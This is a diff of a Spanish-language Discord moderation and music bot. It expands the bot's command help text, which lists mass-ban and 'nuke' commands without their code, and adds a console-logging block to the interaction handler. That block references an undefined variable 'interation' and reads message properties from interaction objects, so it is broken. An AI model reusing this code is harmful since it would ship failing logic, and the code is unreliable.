-    message.reply('TODAS LAS FUNCTIONES DE MIYAMURABOT\n\nAdministración De Servers\n!mute @user [duración] [razón] - Mutear\n!unmute @user - Unmute\n!eliminar @user [razón] - Ban\n!unkick @user - Unkick\n!kick @user - Elimina\n!clear [1 al 100] - Limpia el chat\n!userinfo @user - Información del usuario\n!serverinfo - Información del servidor\n!ban @user - Da ban al user\n!banlist - Revisa los usuarios baneados\n!members - Revisa los miembros\n!banall - Banea a todos\n!nuke - No se que hace (totalmente beta)\n!poll - Crea encuesta\n!nickname @user - Cambia el nickname\n!avatar - Revisa el perfil\n\nInfo Rpg\n!coinflip - Lanza una moneda\n!dado - Un número random del 1 al 6\n!random - Un número random del 1 al 100\n!ppt - Juega piedra papel o tijera con el bot\n!8ball - As una pregunta\n\nInfo De Bot\n!ping - Velocidad del bot\n!uptime - Tiempo de actividad del bot\n!infobot - Información del bot\n!botinfo - Mas información del bot\n\nInfo De Play\n!play [canción] - Escucha una canción\n!stop - Para la reproducción\n!skip - Salta a la siguiente canción a reproducir\n!pause - Pausa la reproducción\n!resume - Reanudar la reproducción\n!volume - Ajusta el volumen de la reproducción\n!list - Lista de reproducción\n!time - Tiempo a terminar la canción\n\nInfo De Servers\n!createchannel - Crea un canal\n!delchannel - Elimina un canal\n!channels - Canales del servidor\n!emojis - Revisa los emojis del server\n\nInfo De Roles\n!createrole - Crea un roll\n!delrole - Elimina un roll\n!getrole - Revisa el roll de un miembro\n!removerole - Quita el roll de un miembro \n!roles - Roles del servidor\n!roleinfo - Revisa el roll');
+    message.reply('TODAS LAS FUNCTIONES DE MIYAMURABOT\n\nAdministración De Servers\n!mute @user [duración] [razón] - Mutear\n!unmute @user - Unmute\n!eliminar @user [razón] - Ban\n!unkick @user - Unkick\n!kick @user - Elimina\n!clear [1 al 100] - Limpia el chat\n!userinfo @user - Información del usuario\n!serverinfo - Información del servidor\n!ban @user - Da ban al user\n!banlist - Revisa los usuarios baneados\n!members - Revisa los miembros\n!banall - Banea a todos\n!nuke - No se que hace (totalmente beta)\n!poll - Crea encuesta\n!nickname @user - Cambia el nickname\n!avatar - Revisa el perfil\n\nInfo Rpg\n!coinflip - Lanza una moneda\n!dado - Un número random del 1 al 6\n!random - Un número random del 1 al 100\n!ppt - Juega piedra papel o tijera con el bot\n!8ball - As una pregunta\n\nInfo De Bot\n!ping - Velocidad del bot\n!uptime - Tiempo de actividad del bot\n!infobot - Información del bot\n!botinfo - Mas información del bot\n\nInfo De Play\n!play [canción] - Escucha una canción\n!stop - Para la reproducción\n!skip - Salta a la siguiente canción a reproducir\n!pause - Pausa la reproducción\n!resume - Reanudar la reproducción\n!volume - Ajusta el volumen de la reproducción\n!list - Lista de reproducción\n!time - Tiempo a terminar la canción\n\nInfo Random\n!traducir [idioma + texto] - Traduce de un idioma a otro\npiropo - Un piropo random\n\nInfo De Servers\n!createchannel - Crea un canal\n!delchannel - Elimina un canal\n!channels - Canales del servidor\n!emojis - Revisa los emojis del server\n\nInfo De Roles\n!createrole - Crea un roll\n!delrole - Elimina un roll\n!getrole - Revisa el roll de un miembro\n!removerole - Quita el roll de un miembro \n!roles - Roles del servidor\n!roleinfo - Revisa el roll\n\nInfo Mas Comandos\n!mascommands');
+    }
+    
+   if (command === 'mascommands') { 
+   message.reply('MAS COMADOS DE MIYAMURABOT\n\nInfo De Guardado\n!guardar - Guarda un texto por 7 dias\n!ver - Revisa tu texto \n!restablecer - Restablece el tiempo de tu texto\n!borrar - Elimina El texto guardado\n!entradas - Revisar cuantos espacios hay para guardar textos\n!tiempo - Revisa el tiempo que le queda a tu texto guardado\n\nInfo De Reporte\n!reporte - Reportar al creador\n!reportes - Ver los reportes existentes\n!responder - Responde al reporte\n\nMas Comandos\n!antilink - El bot elimina enlaces de diacord, whatsapp y telegram\n');
     }
     
     if (command === "roles") {
@@ -419,7 +747,7 @@ if (command === "serverinfo") {
     }
 
     // Command: unmute @User
-    else if (command === 'unmute') {
+    if (command === 'unmute') {
         const mentionedUser = message.mentions.members.first();
         if (!mentionedUser) return;
 
@@ -438,7 +766,7 @@ if (command === "serverinfo") {
     }
 
     // Command: kick @User [reason]
-    else if (command === 'eliminar') {
+    if (command === 'eliminar') {
         const mentionedUser = message.mentions.members.first();
         if (!mentionedUser) return;
 
@@ -460,7 +788,7 @@ if (command === "serverinfo") {
     }
 
     // Command: unkick @User
-    else if (command === 'unkick') {
+    if (command === 'unkick') {
         // Since we can't directly mention banned users, we'll extract the user ID
         // Format expected: kub @User or kub UserID
         let userId;
@@ -609,7 +937,6 @@ if (command === "serverinfo") {
         await updateMusicPanel(message.channel);
     }
     
-
     if (command === 'play') {
         const voiceChannel = message.member.voice.channel;
         if (!voiceChannel) return message.reply('❌ Debes estar en un canal de voz.');
@@ -779,6 +1106,15 @@ async function updateMusicPanel(channel) {
 }
 
 client.on('interactionCreate', async (interaction) => {
+
+  const isDM2 = interation.channel.type === 'DM';
+console.log(chalk.bold.cyan('┏┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅•'));
+console.log(`${chalk.bold('┋[📩] Mensaje :')} ${chalk.white(interation.content)} (Tipo: ${interation.channel.type})`);
+console.log(`${chalk.bold('┋[👤] De:')} ${chalk.yellow(interation.author.tag)} ${chalk.white('en el canal:')} ${isDM2 ? chalk.red('DM') : chalk.blue(interation.channel.name)} (${chalk.gray(interaction.channel.id)}`)
+console.log(`${chalk.bold('┋[⚡] Servidor:')} ${isDM2 ? chalk.red('DM') : interation.guild ? chalk.green(interaction.guild.name) : chalk.gray('N/A')}`);
+console.log(chalk.bold.cyan('┗┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅•'));
+console.log(interaction.content) 
+
     if (!interaction.isButton() && !interaction.isModalSubmit()) return;
 
     const queue = player.nodes.get(interaction.guild.id);
